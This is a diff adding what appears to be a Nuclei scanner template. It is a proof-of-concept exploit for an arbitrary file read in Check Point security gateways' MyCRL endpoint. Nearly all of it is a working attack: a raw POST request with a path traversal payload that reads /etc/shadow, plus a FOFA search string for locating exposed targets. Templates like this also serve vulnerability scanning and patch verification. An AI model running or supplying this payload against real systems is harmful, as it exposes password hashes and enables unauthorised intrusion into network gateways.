@@ -1,0 +1,32 @@
+id: poc-cyyr2fggvig1msya
+info:
+  name: Check-Point安全网关MyCRL存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cyyr2fggvig1msya'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cyyr2fggvig1msya
+    fofa: body="check point ssl network"
+http:
+- raw:
+  - 'POST /clients/MyCRL HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (CentOS; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
+
+    Connection: close
+
+    Content-Length: 39
+
+    Accept-Encoding: gzip
+
+
+    aCSHELL/../../../../../../../etc/shadow'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
